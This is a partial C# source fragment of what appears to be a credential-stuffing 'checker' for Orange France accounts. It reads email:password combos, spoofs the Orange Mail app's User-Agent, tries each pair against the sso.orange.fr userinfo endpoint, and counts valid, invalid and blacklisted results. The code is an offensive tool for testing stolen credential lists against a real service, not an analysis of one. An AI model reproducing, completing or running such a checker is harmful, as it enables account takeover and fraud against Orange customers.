        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    request.AddHeader("User-Agent", "Mail Orange/3.22.4.1 (OkHttpClient 3)");
                    request.AddHeader("Accept-Charset", "UTF-8");
                    request.AddHeader("Host", "sso.orange.fr");
                    request.AddHeader("Connection", "close");
                    request.AddHeader("Accept-Encoding", "gzip, deflate");
                    string pre = request.Get($"https://sso.orange.fr/WT/userinfo/?wt-mco=MCO%3DOFR&serv=OMAAIS&wt-cvt=4&charset=utf-8&info=cooses%2Cdsn%2Cmsisdn%2Cufn%2Cspr%2Cuit%2Culn%2Culo%2Cid_tracking&wt-email={credentials[0]}&wt-pwd={credentials[1]}").ToString();
                    if (pre.Contains("authentication failed"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (pre.Contains("value=\"UNAVAILABLE\""))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (pre.Contains("<message>user blacklisted</message>") || pre.Contains("name=\"msisdn\""))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
